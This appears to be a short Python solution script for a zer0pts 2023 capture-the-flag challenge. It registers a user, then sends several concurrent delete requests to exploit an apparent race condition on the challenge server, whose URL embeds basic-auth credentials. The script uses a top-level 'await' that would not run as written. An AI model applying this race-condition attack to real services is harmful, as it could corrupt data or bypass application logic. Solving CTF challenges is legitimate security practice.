import requests
import threading
import asyncio

# change this to whatever the docker is running at
SERVER_ADDR = "http://ZwXISyFWgdhANMRK:sgSnFIQkROwfzdbG@others.2023.zer0pts.com:62929"

ses = requests.Session()

data = {
    "username": "lorse", # make this user first
    "password": "lorse",
    "profile": "lorse"
}

ses.post(SERVER_ADDR+"/register", data=data)


def req(i):
    print(i, "start")
    ses.post(url=f"{SERVER_ADDR}/user/lorse/delete")
    print(i, "end")
    return i


async def async_req(loop, i):
    return await loop.run_in_executor(None, req, i)

loop = asyncio.get_event_loop()
tasks = [async_req(loop, i) for i in range(3)]
resusts = await asyncio.gather(*tasks)
